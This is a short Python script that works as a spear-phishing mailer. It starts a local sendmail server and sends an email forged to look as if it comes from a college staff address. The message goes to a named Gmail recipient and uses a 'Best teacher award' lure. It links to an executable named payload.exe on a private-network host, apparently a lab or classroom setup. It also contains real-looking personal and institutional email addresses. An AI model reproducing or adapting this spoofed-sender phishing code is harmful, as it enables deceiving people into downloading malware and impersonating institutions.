#!/usr/bin/python 
import smtplib, string
import os, time

os.system("/etc/init.d/sendmail start")
time.sleep(4)

HOST = "localhost"
SUBJECT = "Best teacher award"
TO = "gs338917@gmail.com"
FROM = "mlevens@walshcollege.edu"
TEXT = "Greetings Dave! Click the following link to view the top voted teachers in the IT department: http://192.168.3.49/payload.exe. Please submit your response to mivezaj@academic.walshcollege.edu"
BODY = string.join((
        "From: %s" % FROM , 
        "",
        TEXT
        ), "\r\n")
server = smtplib.SMTP(HOST)
server.sendmail(FROM, [TO], BODY)
server.quit()

time.sleep(4)
os.system("/etc/init.d/sendmail stop")
